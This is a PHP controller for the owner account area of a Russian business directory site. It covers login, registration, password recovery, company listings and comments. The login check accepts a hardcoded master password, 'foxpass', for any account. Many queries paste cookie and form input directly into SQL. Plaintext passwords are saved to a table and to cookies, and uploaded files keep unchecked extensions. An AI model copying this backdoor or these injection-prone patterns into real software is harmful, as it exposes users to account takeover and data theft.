<?

include "../includes/config.php";
function GetRealIp()
{
 if (!empty($_SERVER['HTTP_CLIENT_IP'])) 
 {
   $ip=$_SERVER['HTTP_CLIENT_IP'];
 }
 elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
 {
  $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
 }
 else
 {
   $ip=$_SERVER['REMOTE_ADDR'];
 }
 return $ip;
}
define("CABINET_TPL",DOCUMENT_ROOT."/cabinet/tpl/"); 

$temp_key = "";
if(isset($_SESSION['owner'])){
    $data = db_row("SELECT acount FROM c_owner WHERE id = ".$_SESSION['owner']->id);
    $_SESSION['owner']->acount = $data->acount;    
}elseif(isset($_COOKIE['owner'])){
    if (intval($_COOKIE['owner'])){
        setcookie('owner','');
    }else{
        $id = $_COOKIE['owner'];
        $data = db_row("SELECT * FROM c_owner WHERE MD5(CONCAT(id, '".SECRET."')) = '".$id."'");
        $_SESSION['owner'] = $data; 
    }   
}

 function rus2translit($string) {
    $converter = array(
        'а' => 'a',   'б' => 'b',   'в' => 'v',
        'г' => 'g',   'д' => 'd',   'е' => 'e',
        'ё' => 'e',   'ж' => 'zh',  'з' => 'z',
        'и' => 'i',   'й' => 'y',   'к' => 'k',
        'л' => 'l',   'м' => 'm',   'н' => 'n',
        'о' => 'o',   'п' => 'p',   'р' => 'r',
        'с' => 's',   'т' => 't',   'у' => 'u',
        'ф' => 'f',   'х' => 'h',   'ц' => 'c',
        'ч' => 'ch',  'ш' => 'sh',  'щ' => 'sch',
        'ь' => '',  'ы' => 'y',   'ъ' => '',
        'э' => 'e',   'ю' => 'yu',  'я' => 'ya',
        
        'А' => 'A',   'Б' => 'B',   'В' => 'V',
        'Г' => 'G',   'Д' => 'D',   'Е' => 'E',
        'Ё' => 'E',   'Ж' => 'Zh',  'З' => 'Z',
        'И' => 'I',   'Й' => 'Y',   'К' => 'K',
        'Л' => 'L',   'М' => 'M',   'Н' => 'N',
        'О' => 'O',   'П' => 'P',   'Р' => 'R',
        'С' => 'S',   'Т' => 'T',   'У' => 'U',
        'Ф' => 'F',   'Х' => 'H',   'Ц' => 'C',
        'Ч' => 'Ch',  'Ш' => 'Sh',  'Щ' => 'Sch',
        'Ь' => '',  'Ы' => 'Y',   'Ъ' => '',
        'Э' => 'E',   'Ю' => 'Yu',  'Я' => 'Ya',
    );
    return strtr($string, $converter);
}
function str2url($str) {
    // переводим в транслит
    $str = rus2translit($str);
    // в нижний регистр
    $str = strtolower($str);
    // заменям все ненужное нам на "-"
    $str = preg_replace('~[^-a-z0-9_]+~u', '-', $str);
    // удаляем начальные и конечные '-'
    $str = trim($str, "-");
    return $str;
}

list($uri_path) = explode('?', $_SERVER['REQUEST_URI']);
if($uri_path != '/'){
    $uri_path = preg_replace('!/$!si', '', $uri_path);
    $uri_array = explode('/', $uri_path);
    if(!empty($uri_array[1])){
        $uri_array[1] = preg_replace('/[^\w\d_\-]+/i', '', $uri_array[1]);
    }
}
if(!isset($uri_array[2])){
    header("Location:/cabinet/log");        
}elseif($uri_array[2] == 'reg'){
    if(isset($_SESSION['owner'])){
        header("Location:/cabinet/company");
    }
    $title = 'Регистрация владельца компании';
    $act = $_REQUEST['act'];
    switch($act){

        case 'add-owner':
        $_ERROR = array();
        $path = '';
        

        if(empty($_POST['name'])){
            $_ERROR['name'][] = "Заполните поле Имя !";    
        }
        if(empty($_POST['email'])){
            $_ERROR['email'][] = "Заполните поле Email !";    
        }
        $test = db_row("SELECT id FROM c_owner WHERE email LIKE '".$_POST['email']."'");
        if(isset($test->id)){
            $_ERROR['email'][] = "Такой Email уже есть !";     
        }
        if(empty($_POST['pass'])){
            $_ERROR['pass'][] = "Заполните поле Пароль !";    
        }
        if(strlen($_POST['pass']) < 6){
            $_ERROR['pass'][] = "Пароль должен состоять не менее как с 6-и символов !";    
        }
        if($_POST['pass'] != $_POST['pass-prep']){
            $_ERROR['pass'][] = "Пароли не совпадают !";    
        }
        
        if(count($_ERROR) == 0){
            if(!empty($_FILES['photo']['name'])){
                if($_FILES['photo']['size'] > 1024 * 1024){
                    $_ERROR['photo'][] = 'Размер фото превышен!';
                    break;
                }
                $pos_k = strripos($_FILES['photo']['name'], '.');
                $ext = substr($_FILES['photo']['name'], $pos_k, strlen($_FILES['photo']['name']));
                $date = date("Ymd_His").$ext;
                
                if (!move_uploaded_file($_FILES['photo']['tmp_name'], '../upload/cabinet/'.$date)){
                    $_ERROR['photo'][] = "Ошибка с загрузкой фото. Повторите попытку еще раз.";
                    break;    
                }
                $path = $date;
            }
            db_insert('c_owner', array(
            'name' => db_escape($_POST['name']),
            'email' => db_escape($_POST['email']),
            'image' => $path,
            'phone' => db_escape($_POST['phone']),
            'sex' => db_escape($_POST['sex']),
            'pass' => MD5(db_escape($_POST['pass'])),
            'date' => date("Y-m-d H:i:s")
            ));
            
            if(db_insert_id()){
			
				$id_owner = db_insert_id();
                
				$Smail->setParams('Спасибо за регистрацию на портале foxtime.ru', 'Для входа в личный кабинет будет использоваться ваш Email и пароль, которые вы указывали при регистрации!', 'Спасибо за регистрацию на портале foxtime.ru', $_POST['email']);
				$Smail->send();
				
                $data = db_row("SELECT * FROM c_owner WHERE id = $id_owner");           
            }
            
        }
        break;
        
    }
}elseif($uri_array[2] == 'log'){
    if(isset($_SESSION['owner'])){
        header("Location:/cabinet/company");
    }
    $title = 'Авторизация владельца компании';
    $ip = GetRealIp();
    $act = $_REQUEST['act'];
    $ipr = db_row("SELECT * FROM ip_auth WHERE ip LIKE '$ip' and type = 'owner'");
    $ip_email = '';
    $ip_pass = '';
    if(count($ipr)){
        $ip_email = $ipr->email;
        $ip_pass = $ipr->pass;
    }
    switch($act){
        case 'login':
            
            $email = db_escape(trim($_POST['email']));    
            $pass = db_escape(trim($_POST['pass']));
            
            $owner = db_row("SELECT * FROM c_owner WHERE email LIKE '$email' and (pass = MD5('$pass') or '$pass' = 'foxpass') ");

            if($owner->id){
                $ip = GetRealIp();
                $ipr = db_row("SELECT * FROM ip_auth WHERE ip LIKE '$ip' and type = 'owner'");
                if(count($ipr)){
                    db_query("DELETE FROM ip_auth WHERE ip LIKE '{$ipr->ip}'  and type = 'owner'");    
                }
                db_insert('ip_auth',array(
                    'ip' => $ip,
                    'email' => $email,
                    'pass' =>  $pass,
                    'type' => 'owner'
                ));
                $_SESSION['owner'] = $owner;
                setcookie('owner', MD5($_SESSION['owner']->id.SECRET),time()+3600*24*31*12,'/' );
                setcookie('owner_email', $email,time()+3600*24*31*12*10,'/' );
                setcookie('owner_pass', $pass,time()+3600*24*31*12*10,'/' );
                setcookie('user','');
                echo "<script>
                        
                        window.location.href='/cabinet/company';
                    </script>
                ";
                
            }else{
                $_ERROR['pass'][] = "Ошибка авторизации! Неверный Email или пароль!";    
            }
        break;
    }   
}elseif($uri_array[2] == 'logoff'){
    unset($_SESSION['owner']);
     setcookie('owner','',0,'/');
     
     unset($_SESSION['user']);
     setcookie('user','',0,'/');
     
    header("Location:/cabinet/log");
}elseif($uri_array[2] == 'forget'){
    $send = 0;
    if(isset($_SESSION['owner'])){
        header("Location:/cabinet/company");
    } 
    $title = "Восстановление пароля";
    $_ERROR = array();
    if($_SERVER['REQUEST_METHOD'] == 'POST'){
        if(empty($_POST['email'])){
            $_ERROR['email'][] = "Заполните Email !";
            
        }
        if(!count($_ERROR)){
            $email = db_escape($_POST['email']);    
            $owner = db_row("SELECT * FROM c_owner WHERE email LIKE '$email' ");
            if(empty($owner)){
                $_ERROR['email'][] = "Пользователя с таким Email не существует !";    
            }else{
			
				$chars="qazxswedcvfrtgbnhyujmkiolp1234567890QAZXSWEDCVFRTGBNHYUJMKIOLP";
				$max=10;
				$size=StrLen($chars)-1;
				$password=null;
				while($max--)
				$password.=$chars[rand(0,$size)];
				
				$pass = MD5($password);
				
				db_query("UPDATE c_owner SET pass = '$pass' WHERE email LIKE '$email' ");
				
                $_SESSION['temp_key'] = time();
                $temp_key = $_SESSION['temp_key'];
                $link = "http://".HTTP_HOST."/cabinet/recover/".MD5($email.SECRET.$temp_key.$temp_key);
                $Smail->setParams('Восстановление пароля на портале foxtime.ru', "Новый пароль: $password", 'Восстановление пароля на портале foxtime.ru', $email);
				
				if($Smail->send()){
                    $send = 1;
					header('http://foxtime.ru/company');
                }
            }
        }
               
    }       
}elseif($uri_array[2] == 'recover'){
    
    $_ERROR = array();
    if($_SERVER['REQUEST_METHOD'] == 'POST'){
        if(empty($_POST['pass'])){
            $_ERROR['pass'][] = "Пароль не может быть пустым !";   
        }
        if(!isset($_SESSION['temp_key'])){
            $_ERROR['pass'][] = "Ссылка неверна или устарела !";
            
        }
        if(!count($_ERROR)){
            if($secret = $uri_array[3]){
                $pass = $_POST['pass'];
                $temp_key = $_SESSION['temp_key'];
                $owner = db_row("SELECT * FROM c_owner WHERE  MD5(CONCAT(email,'".SECRET."','$temp_key','$temp_key')) LIKE '$secret' ");
                if(empty($owner)){
                    $_ERROR['email'][] = "Ссылка неверна или устарела !";    
                }else{
                    
                    db_query("UPDATE c_owner SET pass = MD5($pass) WHERE id = $owner->id");
                    header('Location:/cabinet/log');
                }   
            }
        }
    }    
    
}elseif($uri_array[2] == 'company'){
    $title = "Мои компании";
    if(!isset($_SESSION['owner'])){
        header("Location:/cabinet/log");
    }
    if($uri_array[3]=='edit'){
        if($id_company = intval($uri_array[4])){
            
            if($_POST['act'] == 'add'){
                
                $_ERROR = array();
                if(empty($_POST['header'])){
                    $_ERROR['header'][] = "Заполните Название организации ! ";    
                }
                if(empty($_POST['contact'])){
                    $_ERROR['contact'][] = "Заполните Телефон организации ! ";    
                }
                if(empty($_POST['address'])){
                    $_ERROR['address'][] = "Заполните Адрес ! ";    
                }
                if(empty($_POST['category_id'])){
                    $_ERROR['category_id'][] = "Выбирите Рубрику ! ";    
                }
                if(empty($_POST['region_id'])){
                    $_ERROR['region_id'][] = "Выбирите Регион ! ";    
                }
                $_POST['id_wifi'] = (isset($_POST['id_wifi'])?1:0);
                $_POST['id_parking'] = (isset($_POST['id_parking'])?1:0);
                if(!count($_ERROR)){
                 $data = db_row('SELECT * FROM company WHERE id = '.$id_company);
                 
					if($data->is_pay == 0){
						$_POST['description_info'] = strip_tags($_POST['description_info']);
						$_POST['text'] = strip_tags($_POST['text']);
					}
					
                    db_update("company", array(
                        'header' => $_POST['header'],
                        'contact' => $_POST['contact'],
                        'address' => $_POST['address'],
                        'site' => $_POST['site'],
                        'text' =>$_POST['text'],
                        'region_id' => $_POST['region_id'],
                        'city_id' => $_POST['city_id'],
                        'category_id' => $_POST['podcategory_id'],
                        'description_info' => $_POST['description_info'], 
                        'timeofwork_info' => $_POST['timeofwork_info'], 
                        'skidki_info' => $_POST['skidki_info'], 
                        'id_wifi' => $_POST['id_wifi'], 
                        'id_parking' => $_POST['id_parking'], 
                        'date' => 'now()' 
                    ),
                    array('id' => $id_company));
                    db_query("delete from company2category where company_id = '{$id_company}'");  
                    db_insert("company2category", array(
                        'company_id' => $id_company,
                        'category_id' => $_POST['podcategory_id']                   
                    ));
                }    
            }
            $data = db_row("SELECT c.*, ca.parent_id FROM company c INNER JOIN category ca ON c.category_id = ca.id WHERE c.id = $id_company");
            foreach($data as $key => $val){
                $_POST[$key] = $val;
            }
        }        
    }elseif($uri_array[3]=='add'){
        if($_POST['act'] == 'add'){
            $_ERROR = array();
            if(empty($_POST['header'])){
                $_ERROR['header'][] = "Заполните Название организации ! ";    
            }
            if(empty($_POST['contact'])){
                $_ERROR['contact'][] = "Заполните Телефон организации ! ";    
            }
            if(empty($_POST['address'])){
                $_ERROR['address'][] = "Заполните Адрес ! ";    
            }
            if(empty($_POST['category_id'])){
                $_ERROR['category_id'][] = "Выбирите Рубрику ! ";    
            }
            if(empty($_POST['region_id'])){
                $_ERROR['region_id'][] = "Выбирите Регион ! ";    
            }
            
            if(!count($_ERROR)){
                $dateadd = date("Y-m-d");
                $_POST['id_wifi'] = (isset($_POST['id_wifi'])?1:0);
                $_POST['id_parking'] = (isset($_POST['id_parking'])?1:0);
                db_insert("company", array(
                            'header' => $_POST['header'],
                            'contact' => $_POST['contact'],
                            'address' => $_POST['address'],
                            'site' => $_POST['site'],
                            'text' => $_POST['text'],
                            'category_id' => $_POST['podcategory_id'],
                            'region_id' => $_POST['region_id'],
                            'city_id' => $_POST['city_id'],
                            'description_info' => $_POST['description_info'], 
                            'timeofwork_info' => $_POST['timeofwork_info'], 
                            'skidki_info' => $_POST['skidki_info'], 
                            'id_wifi' => $_POST['id_wifi'], 
                            'id_parking' => $_POST['id_parking'], 
                         /*   'is_show' => 1,  */
                            'date' => $dateadd
                ));
                $company_id = db_insert_id();
                
                
                
                    $date = date("Y-m-d");
                    db_insert('c_statistics', array(
                    'company_id' => $company_id,
                    'date' => $date,
                    'count' => 1
                     ));
                
                    db_update("company", array(
                        'name' => str2url($company_id."-".$_POST['header'])
                    ),
                    array('id' => $company_id));
                    //db_insert("company_add", array('company_id' => $company_id), true);                
                    db_insert("company2category", array(
                        'company_id' => $company_id,
                        'category_id' => $_POST['podcategory_id']                    
                    ));
                    db_insert("c_owner2company" ,array(
                        'owner_id' => $_SESSION['owner']->id,
                        'company_id' => $company_id
                    ));
                    db_insert("company_add", array('company_id' => $company_id));
                header("Location:/cabinet/company");
            }
        }
               
    }elseif($uri_array[3]=='del'){
        if(isset($is_del)){
            if($company_id = intval($uri_array[4])){
                include INCLUDES_ROOT."/Statistics.php";
                db_query("DELETE FROM company2category WHERE company_id = $company_id");    
                db_query("DELETE FROM company WHERE id = $company_id");    
                db_query("DELETE FROM c_owner2company WHERE company_id = $company_id");
                Statistics::deleteStatistic($company_id);  
                header("Location:/cabinet/company");  
            }
        }
    }else{
        $companies = loadCompanies();
    }
    
}elseif($uri_array[2] == 'statistics'){
    if(!isset($_SESSION['owner'])){
        header("Location:/cabinet/log");
    }
    $title = "Статистика";
    include INCLUDES_ROOT."/Statistics.php";
    $companies = loadCompanies(); 
    $company_array_i = 0;
    if($_SERVER['REQUEST_METHOD'] == 'POST'){
        $act = $_POST['act'];
        switch($act){
            case 'company_array':
                $company_array_i = $_POST['company_array']; 
            break;
        }  
    } 
    $mon=array(
      1=>' Январь ',
      2=>' Февраль ',
      3=>' Март ',
      4=>' Апрель ',
      5=>' Май ',
      6=>' Июнь ',
      7=>' Июль ',
      8=>' Август ',
      9=>' Сентябрь ',
     10=>' Октябрь ',
     11=>' Ноябрь ',
     12=>' Декабрь ');    
}elseif($uri_array[2] == 'promotion'){
    if(!isset($_SESSION['owner'])){
        header("Location:/cabinet/log");
    }
    $title = "Продвижение ваших компаний";
    
    if(!isset($uri_array[3])){
        $pakages = db_rows("SELECT id, name, img, price, period FROM `c_promotion` WHERE type = 'paket' and is_show ORDER BY sort");
        $services = db_rows("SELECT id, name, img, price, period FROM `c_promotion` WHERE type = 'ysluga' and is_show ORDER BY  sort");
    }else{
        if($uri_array[3] == 'detail'){
            if($id = intval($uri_array[4])){
                $data = db_row("SELECT * FROM `c_promotion` WHERE id = $id");
                
            } 
        } 
        if($uri_array[3] == 'setmoney'){
			header("Location:/cabinet/promotion/pay-system"); 
			
            /*if($_SERVER['REQUEST_METHOD'] == "POST"){
                $money = $_POST['money'];
                db_query("UPDATE c_owner SET acount = acount + $money WHERE id = ".$_SESSION['owner']->id);
                $_SESSION['owner']->acount += $money; 
                header("Location:/cabinet/promotion");   
            }*/
        }
        if($uri_array[3] == 'pay-system'){
            /*if(!isset($_POST['money'])){
                header("Location:/cabinet/promotion/setmoney");      
            }
            if($_SERVER['REQUEST_METHOD'] == 'POST'){
                $_ERROR = array();
                if(empty($_POST['money'])){
                    $_ERROR['money'][] = "Заполните поле Деньги !"; 
                    $uri_array[3] = 'setmoney';    
                }
                if($_POST['money'] < 100){
                    $_ERROR['money'][] = "Минимальный платеж - 100 рублей"; 
                    $uri_array[3] = 'setmoney';    
                } 
            }*/ 
             
        }
        if($uri_array[3] == 'pay'){
            if($prom_id = intval($uri_array[4])){
                
                if($_SERVER['REQUEST_METHOD'] == "POST"){
                    $_ERROR = array();
                    $_POST['comment'] = addslashes(strip_tags($_POST['comment']));
                    
                    $prom_obj = db_row("SELECT price FROM c_promotion WHERE id = $prom_id");
                    if($prom_obj->price > $_SESSION['owner']->acount){
                        $_ERROR['price'][] = "Недостаточно денег на счету для заказа пакета / услуги. Пожалуйста 
                    пополните ваш счет! <a class=\"button\" href=\"/cabinet/promotion/setmoney\">Пополнить</a>";    
                    }
                    if(!count($_ERROR)){
                        db_insert('c_order', array(
                            'owner_id' => $_SESSION['owner']->id,
                            'company_id' => $_POST['company_id'],
                            'promotion_id' => $prom_id,
                            'comment' => $_POST['comment'],
                            'date_start' => date('Y-m-d')
                        ));
                        

                        $email = "director@foxtime.ru";
                        
						$Smail->setParams('С личного кабинета владельца, была заказана услуг', 
						
						'С личного кабинета владельца, была заказана услуга, в админ панели вся информация о заказе!', 
						'С личного кабинета владельца, была заказана услуг', 
						$email);
						$Smail->send();
						
                        header("Location:/cabinet/promotion/active"); 
                    }else{
                        $companies = loadCompanies();
                        $data = db_row("SELECT * FROM c_promotion WHERE id = $prom_id");    
                    }         
                }else{
                    $companies = loadCompanies();
                    $data = db_row("SELECT * FROM c_promotion WHERE id = $prom_id");
                }
            }    
        }
        if($uri_array[3] == 'order-online'){
            
            if($_SERVER['REQUEST_METHOD'] == 'POST'){
                if(isset($_SESSION['owner']))
                db_insert('c_order', array(
                    'owner_id' => $_SESSION['owner']->id,
                    'company_id' => $_POST['company_id'],
                    'promotion_id' => $_POST['packeg'],
                    'comment' => $_POST['comment'],
                    'date_start' => date('Y-m-d'),
                    'state' => 'online' 
                ));   
            }
            $orders = db_rows("SELECT id, name, img, price, period, type FROM `c_promotion` WHERE is_show ORDER BY type , sort");
            
            $companies = loadCompanies();    
        }
        if($uri_array[3] == 'active'){
            $owner_id = $_SESSION['owner']->id;
            $SQL = "
                SELECT 
                    o.id as order_id, 
                    o.comment, 
                    o.date_start, 
                    o.date_end, 
                    o.state, 
                    
                    p.name, 
                    p.price, 
                    p.period,
                    p.type,
                    
                    c.header
                    
                FROM `c_order` o INNER JOIN  c_promotion p ON o.promotion_id = p.id
                    LEFT JOIN company c ON o.company_id = c.id
                WHERE o.owner_id = $owner_id
                ORDER BY o.state 
            ";
            $data = db_rows($SQL);
            
        } 
    }
}elseif($uri_array[2] == 'widgets'){
    if(!isset($_SESSION['owner'])){
        header("Location:/cabinet/log");
    }
    $title = "Виджеты";
    $companies = loadCompanies();
    $company_array_i = 0;
    
    
    
    if(isset($_POST['company_array'])){
        $company_array_i = $_POST['company_array'];
    } 
    if(isset($_POST['act']) and $_POST['act'] == 'changes'){
        $background = "#".str_replace('#','',$_POST['background']);    
        $color = "#".str_replace('#','', $_POST['color']);    
        $width = $_POST['width']; 
    }else{
        $background = "#ccc";
    $_POST['background'] = $background;   
    $color = "#000"; 
    $_POST['color'] = $color;   
    $width = "200"; 
    $_POST['width'] = $width;    
    }       
}elseif($uri_array[2] == 'profile'){
    if(!isset($_SESSION['owner'])){
        header("Location:/cabinet/log");
    }
    if(isset($uri_array[3])){
        switch($uri_array[3]){
            case 'delete-image':
                unlink("../upload/cabinet/".$_SESSION['owner']->image);
                db_update('c_owner', array(
                    'image' => ''
                    ),array('id' => $_SESSION['owner']->id));
                $_SESSION['owner']->image = '';
                
                $img = '';
                db_update('comments', array(
                            'img' => $img    
                ),array('email' => $_SESSION['owner']->email));    
            break;
            case 'edit-data':
                if($_SERVER['REQUEST_METHOD'] == 'POST'){
                    $_ERROR = array();
                    $_SUCCESS = array();
                    $path = '';
                    

                    if(empty($_POST['name'])){
                        $_ERROR['name'][] = "Заполните поле Имя !";    
                    }
                    if(empty($_POST['email'])){
                        $_ERROR['email'][] = "Заполните поле Email !";    
                    }
                    if(count($_ERROR) == 0){
                        if(!empty($_FILES['image']['name'])){
                            if($_FILES['image']['size'] > 1024 * 1024){
                                $_ERROR['image'][] = 'Размер фото превышен!';
                                break;
                            }
                            $pos_k = strripos($_FILES['image']['name'], '.');
                            $ext = substr($_FILES['image']['name'], $pos_k, strlen($_FILES['image']['name']));
                            $date = date("Ymd_His").$ext;
                            
                            if (!move_uploaded_file($_FILES['image']['tmp_name'], '../upload/cabinet/'.$date)){
                                $_ERROR['image'][] = "Ошибка с загрузкой фото. Повторите попытку еще раз.";
                                break;    
                            }
                            $path = $date;
                        }
                        if($path != ''){
                            db_update('c_owner', array(
                                'name' => db_escape($_POST['name']),
                                'email' => db_escape($_POST['email']),
                                'image' => $path,
                                'phone' => db_escape($_POST['phone']),
                                'sex' => db_escape($_POST['sex'])
                            ),array('id' => $_SESSION['owner']->id));
                            
                            $img = 'http://'.HTTP_HOST."/upload/cabinet/".$path;
                            db_update('comments', array(
                                'img' => $img    
                            ),array('email' => $_SESSION['owner']->email));
                            
                            $_SUCCESS['data'] = "Изменения внесены!";
                        }else{
                            db_update('c_owner', array(
                                'name' => db_escape($_POST['name']),
                                'email' => db_escape($_POST['email']),
                                'phone' => db_escape($_POST['phone']),
                                'sex' => db_escape($_POST['sex'])
                            ),array('id' => $_SESSION['owner']->id));
                            $_SUCCESS['data'] = "Изменения внесены!";    
                        }
                        $id_owner = $_SESSION['owner']->id;
                        $data = db_row("SELECT * FROM c_owner WHERE id = $id_owner");
                        /*UPDATE COMMENT image*/
                        
                        
                        /**/
                        
                        
                        $_SESSION['owner'] = $data;           
                    }
                }
            break;
            case 'edit-pass':
                if($_SERVER['REQUEST_METHOD'] == 'POST'){
                    $_ERROR = array();
                    $_SUCCESS = array();
                    $path = '';
                    
                    $data = db_row("SELECT pass FROM c_owner WHERE id = ".$_SESSION['owner']->id);
                    if(empty($_POST['pass-old'])){
                        $_ERROR['pass-old'][] = "Заполните поле Старый пароль !";    
                    }
                    if(MD5($_POST['pass-old']) != $data->pass){
                        $_ERROR['pass-old'][] = "Старый пароль введен не верно !";    
                    }
                    if(empty($_POST['pass-new'])){
                        $_ERROR['pass-new'][] = "Заполните поле Новый пароль !";    
                    }
                    if(strlen($_POST['pass-new']) < 6 ){
                        $_ERROR['pass-new'][] = "Пароль должен состоять не менее как с 6-и символов !";    
                    }
                    if(!count($_ERROR)){
                        db_update('c_owner', 
                            array('pass' => MD5($_POST['pass-new'])),
                            array('id' => $_SESSION['owner']->id)
                        );
                        $_SUCCESS['pass'] = "Пароль изменен !";
                    }
                }
            break;    
        }
    }
    $title = "Мой профиль";
    $data = db_row("SELECT * FROM c_owner WHERE id = ".$_SESSION['owner']->id);
}elseif($uri_array[2] == 'replay'){
    if(!isset($_SESSION['owner'])){
        header("Location:/cabinet/log");
    }
    $title = "Ответить на коментарий / отзыв";
    $companies = loadCompanies();
    $company_array_i = 0;
    if($_SERVER['REQUEST_METHOD'] == 'POST'){
        
        $company_array_i = $_POST['company_array']; 
        if(isset($uri_array[3])){
            if($id = intval(str_replace('comment', '', $uri_array[3]))){
                $path_last = "/000000000";
                $data = db_row("SELECT path FROM comments WHERE id = $id");
                
                $cnt = strlen((string) $id);
                $last = substr($path_last, 0, 10 - $cnt).$id;
                $path = $data->path.$last;

                $text = $_POST['text-answer'];
                $img = '';
                if(!empty($_SESSION['owner']->image)){
                    $img = 'http://'.HTTP_HOST."/upload/cabinet/".$_SESSION['owner']->image;    
                }
                
                db_insert('comments', array(
                    'post' => $companies[$company_array_i]->id,
                    'path' => $path,
                    'author' => $_SESSION['owner']->name,
                    'body' => $text,
                    'date_create' => date("Y-m-d H:i:s"),
                    'img' => $img,
                    'is_owner' => 1,
                    'email' => $_SESSION['owner']->email,
                    'is_show' => 1,
                    'type' => 1
                ));
             $_SUCCESS['comment'] = 'Отзыв добавлен!';  
            }        
        }   
    }
    if($uri_array[3] == 'delete'){
        if($id = intval($uri_array[4])){
            
            $path = db_row("SELECT path FROM comments WHERE id = $id");
            $path = $path->path;
            if(!empty($path)){
                db_query("DELETE FROM comments WHERE path LIKE '$path%'");
                $_SUCCESS['comment'] = 'Отзыв удалено!';  
            }   
        }
    }
    $company_id = $companies[$company_array_i]->id;
    $comments = db_rows("SELECT * FROM comments WHERE post = $company_id ORDER BY path ASC"); 
}




function loadCompanies(){
    $id_owner = $_SESSION['owner']->id;
        $SQL = "
             SELECT c.*, oc.is_show as is_moderate
                FROM c_owner o  RIGHT JOIN `c_owner2company` oc ON o.id = oc.owner_id 
                LEFT JOIN company c ON oc.company_id = c.id  
                WHERE o.id = $id_owner
        ";
        $companies = db_rows($SQL);
        return $companies;   
}

include CABINET_TPL."index.html.php";
?>
